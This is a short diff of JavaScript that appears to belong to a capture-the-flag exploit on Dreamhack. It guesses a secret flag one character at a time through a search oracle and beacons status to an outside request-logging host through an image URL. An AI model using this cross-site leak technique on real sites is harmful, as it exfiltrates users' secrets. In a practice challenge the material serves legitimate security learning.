@@ -22,12 +22,11 @@
         let secret = "DH{22d";
 
         while (!secret.includes("}")) {
+            let found = false;
             let promises = chars.split("").map(c => 
                 search(secret + c).then(result => ({ char: c, success: result }))
             );
             let results = await Promise.all(promises);
-
-            let found = false;
 
             for (let rslt of results) {
                 if (rslt.success) {
@@ -40,7 +39,7 @@
 
             if (!found) {
                 img.src = `https://gscnife.request.dreamhack.games/failed`;
-                break;
+                //break;
             }
         }
     }
